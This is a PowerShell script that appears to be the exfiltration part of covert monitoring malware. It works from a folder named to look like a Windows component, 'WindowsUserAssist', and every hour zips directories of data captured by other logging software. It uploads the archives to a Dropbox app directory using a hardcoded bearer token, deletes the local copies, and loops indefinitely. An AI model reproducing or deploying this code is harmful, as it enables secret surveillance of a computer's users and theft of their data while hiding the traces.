#this function will try to send all zip archives in current directory to dropbox
function SendFilesToDropbox()
{
  foreach($zipfile in (Get-ChildItem -Filter "*.zip").Name )
  {
    #write http headers, send specified file to your dropbox app directory
    $DropboxTargetPath="/${env:USERNAME}_${zipfile}"
    $arg = '{ "path": "' + ${DropboxTargetPath} + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + "OywLJyPxoBAAAAAAAAAAD6ph2oSEH_ZPeNISpeNISp-enIsD1C-KCoCK8ahSwsZt"
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", ${authorization})
    $headers.Add("Dropbox-API-Arg", ${arg})
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile ${zipfile} -Headers ${headers}
    
    #remove the file from local storage
    Remove-Item ${zipfile} -Force
  }
}

#----------------------------------------------------------------------------------------------------------------------------

Set-Location "C:\ProgramData\WindowsUserAssist"
$LastUploadTime = (Get-Date)
$WhatFilesToZip = (Get-Date -Format yyyy_MM_dd_HH\\*)
$ZipArchiveName = (Get-Date -Format yyyy_MM_dd_HH.\zip)

#search for old directories that have not been zipped and sent yet (eg. if PC was powered off before 1 hour has passed)
#if found, try to compress and send them to dropbox
foreach($subdir in (Get-Childitem -Directory).Name)
{
  if( ${subdir} -ne ${WhatFilesToZip}.SubString(0,13) )
  {
    #put the files with data captured over the last 1 hour into a zip archive, remove them from previous location
    Compress-Archive -Path "${subdir}\*" -CompressionLevel Optimal -DestinationPath "${subdir}.zip"
    Remove-Item ${subdir} -Force -Recurse
  }
}
if (Test-Connection dropbox.com) { SendFilesToDropbox }

while(1)
{
  $CurrentTime = (Get-Date)
  
  if(${LastUploadTime}.Hour -ne ${CurrentTime}.Hour )
  {
    #wait for logging softwares to switch to writing into a new directory
	Start-Sleep -Seconds 5
  
    #put the files with data captured over the last 1 hour into a zip archive, remove them from previous location
    Compress-Archive -Path "${WhatFilesToZip}" -CompressionLevel Optimal -DestinationPath "${ZipArchiveName}"
    Remove-Item ${WhatFilesToZip}.SubString(0,13) -Force -Recurse
    
    #if there is a connection to dropbox, move zip files from local storage to your dropbox app directory
    if (Test-Connection dropbox.com) { SendFilesToDropbox }
    
    $LastUploadTime = (Get-Date)
    $WhatFilesToZip = (Get-Date -Format yyyy_MM_dd_HH\\*)
    $ZipArchiveName = (Get-Date -Format yyyy_MM_dd_HH.\zip)
  }
  
  Start-Sleep -Seconds 1
}
